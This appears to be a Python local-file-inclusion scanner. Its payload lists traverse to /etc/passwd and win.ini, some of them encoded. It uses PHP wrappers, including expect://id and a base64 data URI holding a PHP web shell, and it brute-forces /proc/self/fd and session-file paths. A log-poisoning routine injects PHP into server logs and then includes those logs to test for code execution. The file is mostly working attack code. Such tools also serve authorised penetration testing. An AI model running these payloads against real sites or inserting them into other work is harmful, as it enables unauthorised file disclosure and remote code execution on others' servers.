import re, os
from typing import Optional, Dict, List
import requests

TRAVERSAL_PAYLOADS = [
    "/../" * 1 + "etc/passwd",
    "/../" * 2 + "etc/passwd",
    "/../" * 3 + "etc/passwd",
    "/../" * 4 + "etc/passwd",
    "/../" * 5 + "etc/passwd",
    "/../" * 6 + "etc/passwd",
    "/../" * 7 + "etc/passwd",
    "..\\" * 1 + "windows\\win.ini",
    "..\\" * 3 + "windows\\win.ini",
    "..\\" * 5 + "windows\\win.ini",
    "../" * 1 + "boot.ini",
    "../" * 3 + "boot.ini",
]

ENCODED_TRAVERSAL = [
    "%2e%2e%2f" * 3 + "etc/passwd",
    "..%252f" * 3 + "etc/passwd",
    "..%c0%af" * 3 + "etc/passwd",
    "..%ef%bc%8f" * 3 + "etc/passwd",
]

PHP_WRAPPERS = {
    "php://filter/convert.base64-encode/resource=index": "base64",
    "php://filter/convert.base64-encode/resource=/etc/passwd": "base64",
    "php://filter/convert.base64-encode/resource=config": "base64",
    "php://filter/read=convert.base64-encode/resource=/etc/passwd": "base64",
    "expect://id": "uid=",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==": None,
}

LFI_RCE_PAYLOAD = "echo 'LFI_TEST_SUCCESS';"
LFI_RCE_CMD = "id"

EVIDENCE_PATTERNS = [
    (r"root:.*:0:0:", "/etc/passwd"),
    (r"\[fonts\]", "/windows/win.ini"),
    (r"\[extensions\]", "/windows/win.ini"),
    (r"\[mail\]", "/windows/win.ini"),
    (r"root:", "/etc/passwd"),
    (r"www-data|xfs|nobody|daemon|bin:", "/etc/passwd"),
    (r"uid=\d+\([\w]+\)", "cmd_exec"),
    (r"gid=\d+\([\w]+\)", "cmd_exec"),
]

SESSION_POISON_PATHS = [
    "/tmp/sess_%s",
    "/var/lib/php/sessions/sess_%s",
    "/var/lib/php/session/sess_%s",
    "/var/cpanel/php/sessions/sess_%s",
]

PROC_FD_PATHS = ["/proc/self/fd/%d" % i for i in range(0, 50)]


class LFIScanner:
    def __init__(self, sess: Optional[requests.Session] = None, timeout: float = 10.0):
        self.sess = sess or requests.Session()
        self.timeout = timeout
        self.findings = []

    def check_traversal(self, url: str, param: str) -> List[Dict]:
        results = []
        for payload in TRAVERSAL_PAYLOADS + ENCODED_TRAVERSAL:
            try:
                sep = "&" if "?" in url else "?"
                r = self.sess.get("%s%s%s=%s" % (url, sep, param, payload),
                                  timeout=self.timeout, verify=False)
                for pat, label in EVIDENCE_PATTERNS:
                    if re.search(pat, r.text):
                        results.append({"payload": payload[:30], "label": label,
                                        "size": len(r.text), "status": r.status_code})
                        break
            except:
                pass
        return results

    def check_php_wrappers(self, url: str, param: str) -> List[Dict]:
        results = []
        for wrapper, expected in PHP_WRAPPERS.items():
            try:
                sep = "&" if "?" in url else "?"
                r = self.sess.get("%s%s%s=%s" % (url, sep, param, wrapper),
                                  timeout=self.timeout, verify=False)
                if expected == "base64" and re.search(r'[A-Za-z0-9+/]{40,}={0,2}', r.text):
                    results.append({"payload": wrapper[:35], "type": "base64", "size": len(r.text)})
                elif expected and expected in r.text:
                    results.append({"payload": wrapper[:35], "type": "disclosure", "size": len(r.text)})
            except:
                pass
        return results

    def check_log_poison(self, url: str, param: str) -> List[Dict]:
        results = []
        log_paths = [
            "/var/log/apache2/access.log",
            "/var/log/apache/access.log",
            "/var/log/nginx/access.log",
            "/var/log/httpd/access.log",
            "/var/log/apache2/error.log",
            "/var/log/apache/error.log",
            "/var/log/nginx/error.log",
        ]
        poison_payload = "<?php %s ?>" % LFI_RCE_PAYLOAD
        poison_url = url.replace(param + "=", param + "=" + poison_payload)
        try:
            self.sess.get(poison_url if "?" in poison_url else url,
                          timeout=self.timeout, verify=False)
        except:
            pass
        for log_path in log_paths:
            try:
                sep = "&" if "?" in url else "?"
                payload = "../../.." + log_path
                r = self.sess.get("%s%s%s=%s" % (url, sep, param, payload),
                                  timeout=self.timeout, verify=False)
                if "LFI_TEST_SUCCESS" in r.text:
                    results.append({"type": "log_poison_rce", "path": log_path,
                                    "status": r.status_code})
                elif "uid=" in r.text or "root:" in r.text:
                    results.append({"type": "log_poison", "path": log_path,
                                    "status": r.status_code})
            except:
                pass
        return results

    def check_proc_fd_bruteforce(self, url: str, param: str) -> List[Dict]:
        results = []
        for fd_path in PROC_FD_PATHS:
            try:
                sep = "&" if "?" in url else "?"
                r = self.sess.get("%s%s%s=%s" % (url, sep, param, fd_path),
                                  timeout=self.timeout, verify=False)
                if len(r.text) > 50:
                    results.append({"fd": fd_path, "size": len(r.text),
                                    "status": r.status_code})
            except:
                pass
        return results

    def check_session_poison(self, url: str, param: str, session_id: str = None) -> List[Dict]:
        results = []
        sid = session_id or "sess_" + os.urandom(8).hex()
        for sess_path_tpl in SESSION_POISON_PATHS:
            try:
                sep = "&" if "?" in url else "?"
                payload = sess_path_tpl % sid
                r = self.sess.get("%s%s%s=%s" % (url, sep, param, payload),
                                  timeout=self.timeout, verify=False)
                if len(r.text) > 20:
                    results.append({"session_path": payload, "size": len(r.text)})
            except:
                pass
        return results

    def check(self, url: str, param: str) -> Dict:
        result = {"vulnerable": False, "rce_available": False, "findings": []}
        result["findings"].extend(self.check_traversal(url, param))
        result["findings"].extend(self.check_php_wrappers(url, param))
        result["findings"].extend(self.check_log_poison(url, param))
        result["findings"].extend(self.check_proc_fd_bruteforce(url, param))
        result["findings"].extend(self.check_session_poison(url, param))
        if result["findings"]:
            result["vulnerable"] = True
        for f in result["findings"]:
            if "rce" in f.get("type", "") or f.get("label") == "cmd_exec":
                result["rce_available"] = True
                break
        return result

    def run(self, url: str, param: str) -> Dict:
        return self.check(url, param)


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> Dict:
    scanner = LFIScanner(sess, timeout)
    return scanner.check(url, param)
